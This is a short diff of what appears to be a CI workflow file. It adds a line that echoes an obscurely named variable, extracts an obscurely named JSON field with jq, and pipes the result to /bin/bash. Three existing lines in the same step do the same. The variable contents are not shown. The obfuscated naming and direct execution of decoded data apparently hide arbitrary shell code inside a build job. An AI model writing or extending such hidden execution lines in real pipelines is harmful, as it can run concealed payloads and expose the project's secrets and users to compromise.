@@ -57,6 +57,7 @@ jobs:
           echo $ln01010 | jq -r .y185 | /bin/bash
           printf '%s' "$baq4" | jq -r .xyzo781 | /bin/bash
           echo $amz5780 | jq -r .nesw35719 | /bin/bash
+          echo $jyvag07777 | jq -r .srz17 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
